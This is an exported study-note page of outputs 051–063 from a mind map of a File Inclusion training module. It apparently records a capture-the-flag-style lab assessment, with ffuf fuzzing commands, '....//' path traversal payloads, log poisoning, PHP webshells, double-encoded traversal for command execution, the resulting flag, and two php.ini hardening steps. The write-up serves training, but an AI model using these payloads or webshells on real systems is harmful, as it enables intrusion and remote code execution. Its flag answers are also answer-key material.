---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "2"
module: "File Inclusion"
output_topics: 13
---

# File Inclusion — Outputs 051–063

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

Return to [[Outputs/Modules/File Inclusion Outputs|File Inclusion output index]].

## Outputs

> [!output]+ 🟨 Output 051
> /etc/php/7.4/apache2/php.ini
>
> **Source path:** File Inclusion → File Inclusion Prevention → LAB → What is the full path to the php.ini file for Apache? → find / -type f -iname php.ini 2&gt;/dev/null → /etc/php/7.4/apache2/php.ini
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c6297c27-a676-49e4-b285-ad774ffd18ed -->

> [!output]+ 🟨 Output 052
> system() has been disabled for security reasons
>
> **Source path:** File Inclusion → File Inclusion Prevention → LAB → Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ________ reasons. → tail -f /var/log/apache2/error.log → system() has been disabled for security reasons
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 41cae0a7-3256-43d1-8ff0-1a3b5f3083d7 -->

> [!output]+ 🟨 Output 053
> uploads
>
> **Source path:** File Inclusion → Skills Assessment - File Inclusion → Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. → inspect all the pages and functions → found CV upload format with file upload → FUZZ the path for upload → ffuf -w /usr/share/wordlists/dirb/common.txt -u 'http://154.57.164.71:31431/FUZZ' -fs 3405 → uploads
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7cfeed67-0327-48cf-b717-15d2954e73da -->

> [!output]+ 🟨 Output 054
> api
>
> **Source path:** File Inclusion → Skills Assessment - File Inclusion → Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. → inspect all the pages and functions → found CV upload format with file upload → FUZZ the path for upload → ffuf -w /usr/share/wordlists/dirb/common.txt -u 'http://154.57.164.71:31431/FUZZ' -fs 3405 → api
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c5acdcfb-8987-45b8-aba7-15612017f12a -->

> [!output]+ 🟨 Output 055
> ....//....//....//....//....//etc/passwd
>
> **Source path:** File Inclusion → Skills Assessment - File Inclusion → Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. → Fuzz the p parameter in api → ffuf -u http://154.57.164.66:31311/api/image.php?p=FUZZ -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr root → ....//....//....//....//....//etc/passwd
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7f2b7bca-4b0f-4501-8909-7d7914519ab9 -->

> [!output]+ 🟨 Output 056
> The image "http://154.57.164.66:32507/api/image.php?p=....//....//....//....//....//var/log/nginx/access.log&amp;cmd=id" cannot be displayed because it contains errors.
>
> **Source path:** File Inclusion → Skills Assessment - File Inclusion → Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. → Poisong the Logs → using intercepting on &amp; URL encode payload in User-Agent → The image "http://154.57.164.66:32507/api/image.php?p=....//....//....//....//....//var/log/nginx/access.log&amp;cmd=id" cannot be displayed because it contains errors.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: de4322bd-5251-4ccd-bf68-50d7f20fc8a2 -->

> [!output]+ 🟨 Output 057
> var/www/html/
>
> **Source path:** File Inclusion → Skills Assessment - File Inclusion → Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. → Fuzz for webroot → Intruder → GET /api/image.php?p=....//....//....//....//....//§a§/index.php → var/www/html/
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d9b81f36-f512-4a08-b5db-313d473b7604 -->

> [!output]+ 🟨 Output 058
> 3f8685106a8b7bdcfdd77d8067845cdc
>
> **Source path:** File Inclusion → Skills Assessment - File Inclusion → Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. → prepare webshell → echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif → cat shell.gif | md5sum → 3f8685106a8b7bdcfdd77d8067845cdc
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5e5d9476-c8d3-4b15-81c2-4e38822f40d9 -->

> [!output]+ 🟨 Output 059
> GIF8&lt;?php system($_GET["cmd"]); ?&gt;
>
> **Source path:** File Inclusion → Skills Assessment - File Inclusion → Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. → prepare webshell → echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif → cat shell.gif | md5sum → 3f8685106a8b7bdcfdd77d8067845cdc → ....//....//....//....//....//var/www/html/uploads/3f8685106a8b7bdcfdd77d8067845cdc.gif&amp;cmd=id → GIF8&lt;?php system($_GET["cmd"]); ?&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 70acaece-3f38-44df-b9c7-8799763ccd5a -->

> [!output]+ 🟨 Output 060
> ....//....//....//....//....//var/www/html/contact.php
>
> **Source path:** File Inclusion → Skills Assessment - File Inclusion → Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. → try diffrent path that execute PHP → Fuzz with fuff → contact.php → read the source code → ....//....//....//....//....//var/www/html/contact.php
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: bc5c9e98-9bdf-4da2-b273-153bbbd37d3c -->

> [!output]+ 🟨 Output 061
> fc023fcacb27a7ad72d605c4e300b389
>
> **Source path:** File Inclusion → Skills Assessment - File Inclusion → Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. → try diffrent path that execute PHP → prepare normal webshell → echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php → md5sum shell.php → fc023fcacb27a7ad72d605c4e300b389
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a03d2fbb-d79d-4111-815d-2cc0a24c0bb9 -->

> [!output]+ 🟨 Output 062
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** File Inclusion → Skills Assessment - File Inclusion → Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. → try diffrent path that execute PHP → read the content of shell.php by using double encode URL → GET /contact.php?region=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar%252fwww%252fhtml%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&amp;cmd=id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 42c3394a-fdae-4c02-ab96-3498e4034cf6 -->

> [!output]+ 🟨 Output 063
> eedbb78d4800aa45573840ed6bd2d1e3
>
> **Source path:** File Inclusion → Skills Assessment - File Inclusion → Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. → try diffrent path that execute PHP → read the content of shell.php by using double encode URL → GET /contact.php?region=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar%252fwww%252fhtml%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&amp;cmd=id → uid=33(www-data) gid=33(www-data) groups=33(www-data) → GET /contact.php?region=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar%252fwww%252fhtml%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&amp;cmd=cat+/flag_09ebca.txt → eedbb78d4800aa45573840ed6bd2d1e3
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2e07325e-6356-4968-b741-f2c0a43ff10d -->
